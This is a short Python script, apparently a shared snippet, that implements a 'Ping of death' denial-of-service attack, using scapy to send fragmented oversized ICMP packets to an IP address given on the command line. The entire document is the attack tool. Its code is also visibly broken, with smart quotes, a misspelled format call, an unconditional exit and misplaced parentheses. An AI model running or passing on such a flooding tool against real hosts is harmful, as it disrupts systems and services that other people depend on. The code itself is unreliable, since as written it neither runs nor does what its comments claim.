#usr/bin/python
# implementation of Ping of death using python 2.x
# here is the code
import sys
from scapy.all import send, fragment, IP,ICMP
if len(sys.argv) <2:
	print”{0}<dst_ip”.formats(sys.argv[0])
sys.exit(1)
send(fragment(IP(dst = sys.argv[1]/ICMP()/(“X”*60000))))
